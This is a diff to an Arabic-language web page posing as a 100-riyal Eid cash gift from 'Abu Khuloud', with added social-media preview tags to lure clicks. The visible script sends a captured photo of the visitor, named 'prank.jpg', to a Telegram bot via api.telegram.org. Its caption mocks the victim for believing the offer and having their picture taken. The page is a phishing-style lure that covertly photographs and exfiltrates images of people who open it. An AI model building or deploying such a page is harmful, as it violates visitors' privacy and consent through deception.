@@ -3,11 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عيديتك من أبو خلود</title>
+    
+    <title>عيديتك من أبو خلود 🎁</title>
+    <meta property="og:title" content="عيديتك من أبو خلود 🎁">
+    <meta property="og:description" content="اضغط هنا لاستلام عيدية بقيمة 100 ريال مقدمة من أبو خلود.">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTg9HaPsfvfZnNIErVSV9Bg0nO6s4P-W8Wxsg&s">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+
     <style>
         body { font-family: 'Arial', sans-serif; background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #fff; padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; border: 1px solid #eee; }
-        .logo { width: 80px; margin-bottom: 20px; }
+        .logo { width: 120px; height: auto; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         h1 { color: #2c3e50; font-size: 24px; }
         .amount { font-size: 48px; color: #27ae60; font-weight: bold; margin: 20px 0; }
         .btn { background: #27ae60; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3); transition: 0.3s; }
@@ -22,7 +29,7 @@
 <body>
 
 <div class="card" id="mainCard">
-    <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" class="logo">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTg9HaPsfvfZnNIErVSV9Bg0nO6s4P-W8Wxsg&s" class="logo">
     <h1>عيديتك من أبو خلود 🎁</h1>
     <p>لقد تم تخصيص عيدية نقدية لك</p>
     <div class="amount">100.00 ر.س</div>
@@ -76,7 +83,7 @@
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'prank.jpg');
-            formData.append('caption', 'السبك صدق وأخذت صورته! 😂📸 \n مبروك الصيد يا أبو خلود');
+            formData.append('caption', 'السبك صدق وأخذت صورته! 😂📸 \n صيد موفق يا أبو خلود');
 
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                 method: 'POST',
